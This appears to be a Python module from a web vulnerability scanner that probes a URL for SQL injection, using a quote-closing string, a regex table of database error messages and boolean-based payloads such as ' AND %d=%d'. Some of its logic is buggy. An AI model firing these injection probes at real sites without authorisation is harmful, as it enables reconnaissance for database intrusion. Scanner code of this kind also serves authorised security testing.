#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re,random
from lib.core import Download
def sqlcheck(url):
    if(not url.find("?")):
        return False
    Downloader = Download.Downloader()
    BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)")
    DBMS_ERRORS = {# 根据报错信息判断服务器数据库版本
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}
    _url = url + "%%2729%28%22"  # 加入)('"进行闭合
    _content = Downloader.get(_url)

    for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
        if(re.search(regex,_content)):
            return True

    content = {}
    content["origin"] = Downloader.get(url)
    for test_payload in BOOLEAN_TESTS:
        RANDINT = random.randint(1, 255)
        _url = url + test_payload%(RANDINT,RANDINT)
        content["true"] = Downloader.get(_url)
        _url = url + test_payload%(RANDINT,RANDINT+1)
        content["false"] = Downloader.get(_url)
        if content["origin"]==content["true"]!=content["false"]:
            return True
        else:
            return False
